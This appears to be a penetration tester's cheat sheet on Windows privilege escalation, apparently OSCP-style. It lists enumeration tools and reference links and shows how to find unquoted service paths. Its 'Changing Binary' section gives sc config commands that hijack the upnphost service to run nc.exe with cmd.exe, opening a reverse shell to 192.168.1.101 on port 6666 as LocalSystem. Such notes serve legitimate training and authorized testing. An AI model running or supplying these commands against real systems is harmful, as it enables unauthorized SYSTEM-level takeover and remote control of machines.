Windows Privilege Escalation

************************************************WINDOWS Prvilege Escalation************************************************

1. Automated Scripts

	https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
	https://www.fuzzysecurity.com/tutorials/16.html
	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
	https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
	https://guif.re/windowseop
	Powerless.bat
	JAWS.ps1
	Sherlock.ps1 (Find-AllVulns)
	PowerUp.ps1 (Invoke-AllChecks)
	WinPEAS.exe
	windows-privesc-check2.exe --dump -G					# Windows privesc shows groups on system
	windows-privesc-check2.exe --audit --all -o output.txt	# Windows privesc shows all system data
	windows-exploit-suggester.py --impact "elevation of privilege" systeminfo.txt
	
2. Changing Binary

	sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"cd 
	sc config upnphost obj= ".\LocalSystem" password= ""
	sc config upnphost depend= ""

3. Unquoted Service Paths

	# Using WMIC
	wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

	# Using scsc 
	sc query
	sc qc service name

	# Look for Binary_path_name and see if it is unquoted.
	
